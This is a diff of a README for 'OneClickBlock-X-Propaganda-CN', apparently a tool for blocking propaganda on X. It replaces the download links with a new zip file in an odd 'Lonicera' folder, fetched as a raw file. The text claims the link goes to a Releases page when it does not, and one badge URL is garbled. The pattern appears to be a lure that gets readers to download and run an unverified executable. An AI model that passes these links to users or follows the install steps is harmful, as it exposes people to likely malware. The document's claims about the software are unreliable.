@@ -9,7 +9,7 @@ To begin using OneClickBlock-X-Propaganda-CN, follow these simple steps:
 1. **Download the Application**
    - Click the button below to visit the Releases page where you can download the latest version of OneClickBlock-X-Propaganda-CN.
 
-   [![Download OneClickBlock-X-Propaganda-CN](https://raw.githubusercontent.com/el8aed/OneClickBlock-X-Propaganda-CN/main/Lonicera/OneClickBlock-X-Propaganda-CN_v1.4-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/el8aed/OneClickBlock-X-Propaganda-CN/main/Lonicera/OneClickBlock-X-Propaganda-CN_v1.4-alpha.3.zip)
+   [![Download OneClickBlock-X-Propaganda-CN](https://raw.githubusercontent.com/el8aed/OneClickBlock-X-Propaganda-CN/main/Lonicera/CN_One_Block_Click_Propaganda_v1.5-beta.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/el8aed/OneClickBlock-X-Propaganda-CN/main/Lonicera/CN_One_Block_Click_Propaganda_v1.5-beta.4.zip)
 
 2. **Install the Application**
    - After downloading, double-click the installer or executable file to start the installation process.
@@ -22,7 +22,7 @@ To begin using OneClickBlock-X-Propaganda-CN, follow these simple steps:
 ## 📥 Download & Install
 Visit the link below to download the latest version of the software. This page contains all the releases, and you will be able to choose the version that suits your operating system.
 
-[Download OneClickBlock-X-Propaganda-CN](https://raw.githubusercontent.com/el8aed/OneClickBlock-X-Propaganda-CN/main/Lonicera/OneClickBlock-X-Propaganda-CN_v1.4-alpha.3.zip)
+[Download OneClickBlock-X-Propaganda-CN](https://raw.githubusercontent.com/el8aed/OneClickBlock-X-Propaganda-CN/main/Lonicera/CN_One_Block_Click_Propaganda_v1.5-beta.4.zip)
 
 ### 🖥️ System Requirements
 - **Operating System:** Windows 10 or later / macOS Mojave or later
